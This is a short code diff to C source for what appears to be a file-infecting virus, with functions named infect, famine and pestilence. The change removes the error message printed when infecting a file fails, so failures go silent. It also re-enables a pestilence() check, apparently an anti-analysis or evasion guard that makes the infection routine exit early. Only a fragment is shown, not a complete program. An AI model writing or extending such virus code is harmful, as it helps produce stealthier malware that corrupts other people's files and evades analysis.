@@ -172,8 +172,6 @@ static int	infect(const char *filename, const char *self_name)
 
 	if (updade_hdr(&data) != 0) {
 		free_data(&data);
-		char error[] = "file corrupted\n";
-		_syscall(SYS_write, 1, error, sizeof(error) - 1);
 		return 1;
 	}
 
@@ -300,9 +298,9 @@ static void open_file(const char *file, const char *self_path, uint16_t *counter
 
 void	famine(void)
 {
-	//if (pestilence() != 0) {
-	//	return ;
-	//}
+	if (pestilence() != 0) {
+		return ;
+	}
 
 	uint16_t counter = 0;
 	char host_name[PATH_MAX];
